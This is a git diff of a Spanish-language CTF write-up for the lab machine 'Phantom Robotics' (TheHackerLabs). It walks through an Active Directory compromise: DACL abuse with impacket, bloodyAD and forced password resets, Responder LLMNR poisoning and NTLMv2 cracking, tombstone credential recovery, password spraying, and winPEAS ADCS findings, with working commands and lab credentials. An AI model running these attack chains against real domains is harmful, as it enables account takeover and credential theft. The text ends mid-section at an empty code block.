@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Phantom Robotics - TheHackerLabs
-excerpt: "."
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a enumerar el servicio SMB, pero al no encontrar nada, utilizamos las credenciales dadas para aplicar un RYD Cycling Attack, con tal de conocer todos los grupos y usuarios existentes de la máquina AD. También realizamos enumeración del servicio RPC, pero no encontramos algo relevante. Al no encontrar nada, utilizamos la herramienta bloodhound-python y BloodHound para enumerar el AD, siendo de esta forma que descubrimos una cadena de ataques AD-DACL que nos permite adueñarnos de un usuario con el que nos logueamos a la máquina víctima vía WinRM con Evil-WinRM. Además, aplicamos un LLMNR Poisoning, logrando capturar el Hash NTLMv2 de un usuario, que luego crackeamos con JohnTheRipper y resulta que también podemos loguearnos con este usuario. Dentro, encontramos un mensaje que nos da la pista sobre revisar la Tombstone del AD, siendo así que encontramos la contraseña de algún usuario, pero al desconocer de quién es, aplicamos un Password Spraying, descubriendo así a quién le pertenece esta contraseña. Utilizamos este nuevo usuario para buscar un Template vulnerable, ya que al usar winPEASx64, indica que hay varios Templates vulnerables que pueden ser usados para escalar privilegios. Una vez descubierto el Template vulnerable, vemos que podemos aplicar el ataque ESC3, logrando así escalar privilegios."
 date: 2026-04-29
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-phantom/phantom.png
+  teaser: /assets/images/THL-writeup-phantom/Phantom.png
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -21,19 +21,56 @@ tags:
   - SMB Enumeration
   - RYD Cycling Attack
   - RPC Enumeration
+  - BloodHound-Python and BloodHound Enumeration
+  - AD Chain Attack
+  - Abusing AD-DACL WriteOwner 
+  - Abusing AD-DACL AddSelf
+  - Abusing AD-DACL WriteDacl
+  - Abusing AD-DACL ForceChangePassword
+  - LLMNR Poisoning
+  - Cracking Hash
+  - Cracking NTLMv2 Hash
+  - Tombstone AD Enumeration
+  - Password Spraying
+  - System Recognition (Windows)
+  - ESC3 Attack (ADCS ESC3 - Enrollment Agent Template)
+  - Privesc - ESC3 Attack (ADCS ESC3 - Enrollment Agent Template)
+  - Metasploit Module - CVE-2024-30085 (Cloud Files)
+  - Privesc - Metasploit Module - CVE-2024-30085 (Cloud Files)
   - OSCP Style
+  - Metasploit Framework
 ---
-![](/assets/images/THL-writeup-phantom/phantom.png)
+![](/assets/images/THL-writeup-phantom/Phantom.png)
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a enumerar el **servicio SMB**, pero al no encontrar nada, utilizamos las credenciales dadas para aplicar un **RYD Cycling Attack**, con tal de conocer todos los grupos y usuarios existentes de la máquina **AD**. También realizamos enumeración del **servicio RPC**, pero no encontramos algo relevante. Al no encontrar nada, utilizamos la herramienta **bloodhound-python** y **BloodHound** para enumerar el **AD**, siendo de esta forma que descubrimos una **cadena de ataques AD-DACL** que nos permite adueñarnos de un usuario con el que nos logueamos a la máquina víctima vía **WinRM** con **Evil-WinRM**. Además, aplicamos un **LLMNR Poisoning**, logrando capturar el **Hash NTLMv2** de un usuario, que luego crackeamos con **JohnTheRipper** y resulta que también podemos loguearnos con este usuario. Dentro, encontramos un mensaje que nos da la pista sobre revisar la **Tombstone del AD**, siendo así que encontramos la contraseña de algún usuario, pero al desconocer de quién es, aplicamos un **Password Spraying**, descubriendo así a quién le pertenece esta contraseña. Utilizamos este nuevo usuario para buscar un **Template** vulnerable, ya que al usar **winPEASx64**, indica que hay varios **Templates** vulnerables que pueden ser usados para escalar privilegios. Una vez descubierto el **Template** vulnerable, vemos que podemos aplicar el **ataque ESC3**, logrando así escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *arp-scan*
+* *nxc*
+* *smbmap*
+* *rpcclient*
+* *awk*
+* *bloodhound-python*
+* *impacket-owneredit*
+* *impacket-dacledit*
+* *net*
+* *bloodyAD*
+* *Evil-WinRM*
+* *responder*
+* *JohnTheRipper*
+* *PowerShell Commands*
+* *winPEASx64*
+* *certipy-ad*
+* *impacket-psexec*
+* *Metasploit Framework (msfconsole)*
+* *Meterpreter*
+* *Módulo: exploit/multi/handle*
+* *Msfvenom*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *Módulo: exploit/windows/local/cve_2024_30085_cloud_files*
+* *type*
 
 
 <br>
@@ -66,11 +103,17 @@ Herramientas utilizadas:
 						<li><a href="#WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</a></li>
 						<li><a href="#ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</a></li>
 					</ul>
-				<li><a href="#Responder"></a></li>
+				<li><a href="#Responder">Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#Tombstone">Analizando la Tombstone del AD y Aplicando Password Spraying</a></li>
+				<li><a href="#ESC3">Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template</a></li>
+				<li><a href="#Metasploit">Escalando Privilegios con Metasploit Framework</a></li>
+				<ul>
+					<li><a href="#Meterpreter">Obteniendo una Sesión de Meterpreter</a></li>
+					<li><a href="#MetasPrivesc">Escalando Privilegios con el Módulo cve_2024_30085_cloud_files</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -108,7 +151,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 1.91 seconds
 Vamos a probar la herramienta **arp-scan**:
 ```bash
 arp-scan -I eth0 -g 192.168.56.0/24
-Interface: eth0, type: EN10MB, MAC: 08:00:27:8d:c1:60, IPv4: 192.168.56.102
+Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.56.1	XX	PCS Systemtechnik GmbH
 192.168.56.100	XX	PCS Systemtechnik GmbH
@@ -300,11 +343,11 @@ Nmap done: 1 IP address (1 host up) scanned in 94.34 seconds
 <br>
 
 Gracias a este escaneo, podemos ver muchas cosas interesantes:
-* Podemos ver cual es el dominio del **AD** siendo `PHANTOM.THL` y `DC01.PHANTOM.THL`, siendo que podemos guardarlos en el `/etc/hosts`:
+* Podemos ver cuál es el dominio del **AD** siendo `PHANTOM.THL` y `DC01.PHANTOM.THL`, siendo que podemos guardarlos en el `/etc/hosts`:
 ```bash
 echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
 ```
-* Vemos que el **puerto 5985** esta abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía **WinRM**.
+* Vemos que el **puerto 5985** está abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía **WinRM**.
 * El **servicio SMB** nos dice que se necesita un usuario y contraseña para poder utilizarlo.
 
 Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede ayudar a encontrar alguna vulnerabilidad:
@@ -312,7 +355,7 @@ Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede a
 User: mark
 Pass: suP3rPa$sw0rd2026!&
 ```
-Vamos a comenzar con enumeración del **servicio SMB**, luego del **servicio RPC** y por último veamos que podemos realizar antes el **servicio Kerberos**.
+Vamos a comenzar con enumeración del **servicio SMB**, luego del **servicio RPC** y, por último, veamos que podemos realizar ante el **servicio Kerberos**.
 
 
 <br>
@@ -338,7 +381,7 @@ nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!&
 ```
-Si funcionan.
+Sí funcionan.
 
 Veamos qué archivos compartidos existen con la herramienta **smbmap**:
 ```bash
@@ -439,11 +482,11 @@ SMB         192.168.56.100  445    DC01             1123: PHANTOM\DevOps (SidTyp
 SMB         192.168.56.100  445    DC01             1124: PHANTOM\LegacyAdmins (SidTypeUser)
 SMB         192.168.56.100  445    DC01             1125: PHANTOM\Monitoring (SidTypeGroup)
 ```
-Observa todos los grupos que obtenemos y los usuarios.
+Observa todos los grupos y usuarios que obtuvimos.
 
 Con estos usuarios podemos intentar aplicar un **Password Spraying** para saber si alguno de estos tiene la misma contraseña que nuestro usuario actual, pero esto no servira.
 
-Otra opción que tenemos es subir un archivo al directorio **Dev Tools**, suponiendo que todos los archivos que se suban se ejecuten, pero tampoco servira.
+Otra opción que tenemos es subir un archivo al directorio **Dev Tools**, suponiendo que todos los archivos que estén en este recurso se ejecuten, pero tampoco servirá.
 
 Por ahora, dejemos un poco **SMB** y apliquemos enumeración al **servicio RPC**.
 
@@ -554,13 +597,13 @@ tomas
 robert
 LegacyAdmins
 ```
-Ya solo guardalos en un archivo o solo agrega que la salida se guarde en un archivo.
+Ya solo guárdalos en un archivo o solo agrega que la salida se guarde en un archivo.
 
 <br>
 
 <h2 id="BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</h2>
 
-Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso, que nos permita ganar acceso a la máquina víctima.
+Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso que nos permita ganar acceso a la máquina víctima.
 
 Para esto, utilizaremos la herramienta **bloodhound-python** para poder capturar toda esta información:
 ```bash
@@ -586,7 +629,7 @@ INFO: Compressing output into 20260427220657_bloodhound.zip
 ```
 Carga ese **archivo ZIP** a **BloodHound** y busquemos la información del **usuario mark**.
 
-**Nota**: puede que la herramienta llegue a fallar si es que no tienes configurado un **DNS** de la máquina víctima, por lo que puedes hacer lo siguiente:
+**Nota**: Puede que la herramienta llegue a fallar si es que no tienes configurado un **DNS** de la máquina víctima, por lo que puedes hacer lo siguiente:
 ```bash
 nano /etc/resolv.conf
 ----
@@ -604,7 +647,7 @@ Observa que tenemos la siguiente cadena de ataques al seleccionar la opción **R
 <img src="/assets/images/THL-writeup-phantom/Captura2.png">
 </p>
 
-Con lo que podemos ver, podemos realizar una cadena de ataques que nos llevara hasta el **usuario frank**, que es quien se puede conectar a la máquina víctima vía **WinRM**.
+Con lo que podemos ver, podemos realizar una cadena de ataques que nos llevara hasta el **usuario frank**, que es quien se puede conectar a la máquina víctima vía **WinRM** junto a otros 2 usuarios más.
 
 Apliquemos los ataques.
 
@@ -624,7 +667,7 @@ La idea es aplicar la siguiente cadena de ataques:
 * Abusar del permiso `WriteOwner` que tenemos hacia el **usuario bob** para cambiar su contraseña.
 * Abusar del permiso `AddSelf` que tiene el **usuario bob** sobre el grupo **IT**, para agregarlo a este mismo grupo.
 * Abusar del permiso `WriteDacl` que tienen los usuarios del grupo **IT** para agregar al **usuario bob** al grupo **HELPDESK**.
-* Abusar del permiso `ForceChangePassword` que tienen los usuario del grupo **HELPDESK**, en este caso el **usuario bob**, para cambiarle la contraseña del **usuario frank**.
+* Abusar del permiso `ForceChangePassword` que tienen los usuarios del grupo **HELPDESK**, en este caso el **usuario bob**, para cambiarle la contraseña del **usuario frank**.
 * Utilizar al **usuario frank** para ganar acceso a la máquina víctima vía **WinRM** usando **Evil-WinRM**, ya que tiene el permiso `CanPSRemote`.
 
 Todo esto lo aplicaremos a continuación.
@@ -633,7 +676,7 @@ Todo esto lo aplicaremos a continuación.
 
 <h3 id="WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</h3>
 
-Primero entendamos, ¿que hace el permiso `WriteOwner`?
+Primero entendamos, ¿qué hace el permiso `WriteOwner`?
 
 | **Permiso WriteOwner** |
 |:----------------------:|
@@ -641,7 +684,7 @@ Primero entendamos, ¿que hace el permiso `WriteOwner`?
 
 <br>
 
-Ahora entendamos que podemos hacer con este permiso:
+Ahora entendamos qué podemos hacer con este permiso:
 
 | **Abuso del Permiso WriteOwner** |
 |:--------------------------------:|
@@ -649,10 +692,10 @@ Ahora entendamos que podemos hacer con este permiso:
 
 <br>
 
-Aquí te dejo un blog que explica como aplicar abusar de este permiso, checa la sección **Exploitation Phase I**:
+Aquí te dejo un blog que explica cómo abusar de este permiso; checa la sección **Exploitation Phase I**:
 * <a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteOwner</a>
 
-Utilizaremos la herramienta **impacket-owneredit** para hacer que el **usuario mark** sea nuevo propetario del **usuario bob**:
+Utilizaremos la herramienta **impacket-owneredit** para hacer que el **usuario mark** sea nuevo propietario del **usuario bob**:
 ```bash
 impacket-owneredit -action write -new-owner 'mark' -target-dn 'CN=bob,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'mark':'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -663,7 +706,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] - distinguishedName: CN=Admins. del dominio,CN=Users,DC=PHANTOM,DC=THL
 [*] OwnerSid modified successfully!
 ```
-Funciono, modificamos la **DACL** del **objeto de usuario bob**.
+Funcionó, modificamos la **DACL** del **objeto de usuario bob**.
 
 Ahora, usemos la herramienta **impacket-dacledit** para hacer que el **usuario mark** tenga el **Control Total (Full Control)** del **usuario bob**:
 ```bash
@@ -673,26 +716,26 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL backed up to dacledit-20260427-222659.bak
 [*] DACL modified successfully!
 ```
-Se modifico correctamente.
+Se modificó correctamente.
 
 Cambiemos la contraseña del **usuario bob** con la herramienta **net**:
 ```bash
 net rpc password bob 'SuperP@ass123' -U PHANTOM.THL/mark%'suP3rPa$sw0rd2026!&' -S 192.168.56.100
 ```
 
-Comprobemos si funciono el cambio con **netexec**:
+Comprobemos si funcionó el cambio con **netexec**:
 ```bash
 nxc smb 192.168.56.100 -u 'bob' -p 'SuperP@ass123'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\bob:SuperP@ass123
 ```
-Muy bien, funciono correctamente.
+Muy bien, funcionó correctamente.
 
 <br>
 
 <h3 id="AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</h3>
 
-Primero entendamos, ¿que hace el permiso `AddSelf`?
+Primero entendamos, ¿qué hace el permiso `AddSelf`?
 
 | **Permiso AddSelf** |
 |:-------------------:|
@@ -700,7 +743,7 @@ Primero entendamos, ¿que hace el permiso `AddSelf`?
 
 <br>
 
-Ahora entendamos que podemos hacer con este permiso:
+Ahora entendamos qué podemos hacer con este permiso:
 
 | **Abusando del Permiso AddSelf** |
 |:-------:|
@@ -708,7 +751,7 @@ Ahora entendamos que podemos hacer con este permiso:
 
 <br>
 
-Aquí te dejo un blog que explica como abusar de este servicio, checa la sección **Exploitation Phase I**:
+Aquí te dejo un blog que explica como abusar de este servicio; checa la sección **Exploitation Phase I**:
 * <a href="https://www.hackingarticles.in/addself-active-directory-abuse/" target="_blank">Hacking Articles - Abusing AD-DACL: AddSelf</a>
 
 Usaremos la herramienta **bloodyAD** para asignar al **usuario bob** al grupo **IT**:
@@ -727,7 +770,7 @@ PHANTOM\bob
 
 <h3 id="WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</h3>
 
-Primero entendamos, ¿que hace el permiso `WriteDacl`?
+Primero entendamos, ¿qué hace el permiso `WriteDacl`?
 
 | **Permiso WriteDacl** |
 |:---------------------:|
@@ -735,7 +778,7 @@ Primero entendamos, ¿que hace el permiso `WriteDacl`?
 
 <br>
 
-Ahora entendamos que podemos hacer con este permiso:
+Ahora entendamos qué podemos hacer con este permiso:
 
 | **Abusando del Permiso WriteDacl** |
 |:----------------------------------:|
@@ -743,7 +786,7 @@ Ahora entendamos que podemos hacer con este permiso:
 
 <br>
 
-Aquí te dejo un blog que explica como abusar de este servicio, checa la sección **Exploitation Phase II**:
+Aquí te dejo un blog que explica como abusar de este servicio; checa la sección **Exploitation Phase II**:
 * <a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteDacl</a>
 
 Utilizaremos la herramienta **impacket-dacledit** para hacer que el **usuario bob** tenga **Control Total (Full Control)** del grupo **HELPDESK**:
@@ -756,7 +799,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Excelente, funciono.
 
-Como tal, el **usuario bob** aun no esta dentro del grupo **HELPDESK**, pero como ahora tiene el control total, podemos agregarlo con **bloodyAD**:
+Como tal, el **usuario bob** aún no está dentro del grupo **HELPDESK**, pero como ahora tiene el control total, podemos agregarlo con **bloodyAD**:
 ```bash
 bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "HELPDESK" "bob"
 [+] bob added to HELPDESK
@@ -767,7 +810,7 @@ Muy bien, ahora **bob** también pertenece al grupo **HELPDESK**.
 
 <h3 id="ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</h3>
 
-Primero entendamos, ¿que hace el permiso `ForceChangePassword`?
+Primero entendamos, ¿qué hace el permiso `ForceChangePassword`?
 
 | **Permiso ForceChangePassword** |
 |:-------------------------------:|
@@ -775,7 +818,7 @@ Primero entendamos, ¿que hace el permiso `ForceChangePassword`?
 
 <br>
 
-Ahora entendamos que podemos hacer con este permiso:
+Ahora entendamos qué podemos hacer con este permiso:
 
 | **Abuso de Permiso ForceChangePassword** |
 |:----------------------------------------:|
@@ -791,7 +834,7 @@ Utilizaremos la herramienta **net** para cambiar la contraseña del **usuario fr
 net rpc password frank 'JakiadoJeje123' -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
 ```
 
-Comprobemos si funciono el cambio con **netexec**:
+Comprobemos si funcionó el cambio con **netexec**:
 ```bash
 nxc smb 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -815,7 +858,7 @@ Perfecto, tenemos acceso a la máquina víctima vía **WinRM**, pero esto es por
 <br>
 
 Usemos **Evil-WinRM** para entrar a la máquina víctima:
-```bash
+```batch
 evil-winrm -i 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
 
 Evil-WinRM shell v3.9
@@ -829,7 +872,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\frank\Documents> whoami
 phantom\frank
 ```
-Estamos dentro, sin embargo, no encontraremos la flag del usuario por aqui.
+Estamos dentro; sin embargo, no encontraremos la flag del usuario por aquí.
 
 <br>
 
@@ -837,17 +880,17 @@ Estamos dentro, sin embargo, no encontraremos la flag del usuario por aqui.
 
 Regresando al **servicio SMB**, resulta ser bastante extraño que no tenga ningún archivo y que tengamos permiso de escritura y lectura. 
 
-Antes había mencionado que quizá había algún script que ejecute los archivos/script que se carguen al recurso **Dev Tools**, pero al subir una **Reverse Shell** de **Powershell** y después de esperar un rato, no paso nada.
+Antes había mencionado que quizá había algún script que ejecute los archivos/script que se carguen al recurso **Dev Tools**, pero al subir una **Reverse Shell** de **Powershell** y después de esperar un rato, no pasó nada.
 
-Sin embargo, aun pienso que hay algo que debe de estar por ahí ejecutandose, así que vamos a analizar el tráfico del **servicio SMB** con la herramienta **Responder** y veremos si es posible aplicar un **LLMNR Poisoning**.
+Sin embargo, aún pienso que hay algo que debe de estar por ahí ejecutándose, así que vamos a analizar el tráfico del **servicio SMB** con la herramienta **Responder** y veremos si es posible aplicar un **LLMNR Poisoning**.
 
 | **LLMNR Poisoning** |
 |:-------------------:|
-| ** |
+| *El LLMNR Poisoning es un ataque de red en el que un atacante responde a las consultas de resolución de nombres de multidifusión de ámbito local (LLMNR) con respuestas falsificadas, engañando a las víctimas para que se conecten a un host malicioso y revelen sus credenciales de autenticación (normalmente, hash NTLM).* |
 
 <br>
 
-Aquí te dejo un blog que explica como es que se aplica el **LLMNR Poisoning**:
+Aquí te dejo un blog que explica cómo es que se aplica el **LLMNR Poisoning**:
 * <a href="https://evoila.com/blog/llmnr-poisoning/" target="_blank">LLMNR Poisoning</a>
 
 Iniciemos el **Responder** y esperemos un poco.
@@ -865,29 +908,29 @@ responder -I eth0
 [+] Listening for events...
 
 [*] [NBT-NS] Poisoned answer sent to 192.168.56.100 for name PHANTOM (service: File Server)
-[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
 [*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
 [*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
-[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
 [*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
-[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
-[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
+[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
 [*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
-[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
 [*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
-[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
 [*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
-[*] [MDNS] Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM.LOCAL
+[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
 [*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
-[*] [LLMNR]  Poisoned answer sent to fe80::5d19:45aa:ca96:7a12 for name PHANTOM
+[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
 [*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
-[SMB] NTLMv2-SSP Client   : fe80::5d19:45aa:ca96:7a12
+[SMB] NTLMv2-SSP Client   : XX
 [SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
 [SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL.....
 ```
 Hemos capturado un hash **NTLMv2** del **usuario robert**.
 
-Además, el **Responder** parece mencionar un dominio erroneo, pues el dominio correcto es **PHANTOM.THL** y no **PHANTOM.LOCAL**.
+Además, el **Responder** parece mencionar un dominio erróneo, pues el dominio correcto es **PHANTOM.THL** y no **PHANTOM.LOCAL**.
 
 Guarda ese hash en un archivo de texto y usaremos la herramienta **JohnTheRipper** para crackearlo:
 ```bash
@@ -909,11 +952,11 @@ nxc smb 192.168.56.100 -u 'robert' -p '**********'
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\robert:**********
 ```
-Funciona y si recordamos, este usuario se puede conectar a la máquina víctima vía **WinRM**.
+Funciona y, si recordamos, este usuario se puede conectar a la máquina víctima vía **WinRM**.
 
-Conectemonos usando **Evil-WinRM**:
-```bash
-evil-winrm -i 192.168.56.100 -u 'robert' -p 'bLink182'
+Conectémonos usando **Evil-WinRM**:
+```batch
+evil-winrm -i 192.168.56.100 -u 'robert' -p '**********'
                                         
 Evil-WinRM shell v3.9
                                         
@@ -925,11 +968,11 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\robert\Documents>
 ```
 
-Estamos dentro y curiosamente, aquí encontraremos el culpable que permitio el **LLMNR Poisoning**:
-```bash
+Estamos dentro y, curiosamente, aquí encontraremos el culpable que permitió el **LLMNR Poisoning**:
+```batch
 *Evil-WinRM* PS C:\Users\robert\Documents> cat connect.ps1
 $username = "PHANTOM.LOCAL\robert"
-$password = "bLink182"
+$password = "**********"
 
 while ($true) {
 	New-SmbMapping -RemotePath "\\PHANTOM.LOCAL\Dev Tools" -Username $username -Password $password
@@ -939,8 +982,8 @@ while ($true) {
 ```
 También encontraremos un archivo de texto, pero ese lo analizaremos más adelante.
 
-En el escritorio, encontraras la flag del usuario:
-```bash
+En el escritorio, encontrarás la flag del usuario:
+```batch
 *Evil-WinRM* PS C:\Users\robert\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\robert\Desktop> cat user.txt
 ...
@@ -979,7 +1022,7 @@ Remove unused scripts and obsolete configurations
 
 Document performed steps and lessons learned from the migration
 ```
-Parece ser una lista de cosas por hacer después de una migración, pero podemos leer que hay tema importante, siendo que se deben de eliminar las cuentas temporales que fueron creadas durante la migración.
+Parece ser una lista de cosas por hacer después de una migración, pero podemos leer que un hay tema importante, siendo que se deben eliminar las cuentas temporales que fueron creadas durante la migración.
 
 Es posible revisar los elementos eliminados del AD, consultando la **Tombstone**:
 
@@ -989,13 +1032,13 @@ Es posible revisar los elementos eliminados del AD, consultando la **Tombstone**
 
 <br>
 
-Te recomiendo revisar estos blogs que mencionan como revisar la **Tombstone** desde **PowerShell**:
+Te recomiendo revisar estos blogs que mencionan cómo revisar la **Tombstone** desde **PowerShell**:
 * <a href="https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/" target="_blank">How to Check Tombstone Lifetime of Active Directory</a>
 * <a href="https://admindroid.com/how-to-get-deleted-users-in-active-directory" target="_blank">How to Detect Deleted Users in Active Directory</a>
 
 <br>
 
-Lo primero que debemos hacer es revisar en cuanto tiempo se vacia la **Tombstone**:
+Lo primero que debemos hacer es revisar en cuánto tiempo se vacía la **Tombstone**:
 ```batch
 *Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL" -Properties tombstoneLifetime
 
@@ -1038,7 +1081,7 @@ Name              : dev_test
 ObjectClass       : user
 ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
 ```
-En ambos casos, podemos ver que existio un usuario llamado **dev_test**.
+En ambos casos, podemos ver que existió un usuario llamado **dev_test**.
 
 Podemos utilizar el **GUID** de ese usuario para ver sus propiedades como objeto, siendo que encontraremos algo interesante:
 ```bash
@@ -1050,7 +1093,7 @@ DisplayName                     : dev_test
 DistinguishedName               : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
 ...
 ```
-La descripción del usuario parece ser una contraseña, pero no sabemos a que usuario puede pertenecer.
+La descripción del usuario parece ser una contraseña, pero no sabemos a qué usuario puede pertenecer.
 
 Apliquemos **Password Spraying** con **netexec** para identificar si un usuario tiene esta contraseña:
 ```bash
@@ -1068,7 +1111,7 @@ SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Buil
 SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\tomas:**********
 ```
 
-Este usuario también tiene permitido conectarnos a la máquina víctima vía **WinRM**, por lo que usaremos **Evil-WinRM** denuevo:
+Este usuario también tiene permitido conectarnos a la máquina víctima vía **WinRM**, por lo que usaremos **Evil-WinRM** de nuevo:
 ```batch
 evil-winrm -i 192.168.56.100 -u 'tomas' -p '**********'
                                         
@@ -1089,9 +1132,12 @@ phantom\tomas
 
 Llegados a este punto, tenemos en nuestro poder las credenciales de 5 usuarios, pero revisando **BloodHound** no encontraremos una forma de escalar privilegios.
 
-En este punto podemos usar la herramienta **winPEAS** para buscar alguna vulnerabilidad.
+En este punto podemos usar la herramienta **winPEASx64** para buscar alguna vulnerabilidad.
 
-Al ejecutarlo desde la sesión del **usuario frank**, nos dira lo siguiente:
+Puedes descargar **winPEASx64** desde aquí:
+* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>
+
+Al ejecutarlo desde la sesión del **usuario frank**, nos dirá lo siguiente:
 ```bash
 ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
 È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
@@ -1109,8 +1155,9 @@ If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ES
   Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)
   [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).
 ```
+Esto indica que es posible usar uno de los 5 **templates** para poder escalar privilegios, y entre estos podemos ver uno curioso que se llama **Phantom-DevAuth**.
 
-
+Podemos enumerar los **templates** del AD con la herramienta **certipy-ad**; probemos con el **usuario frank**:
 ```bash
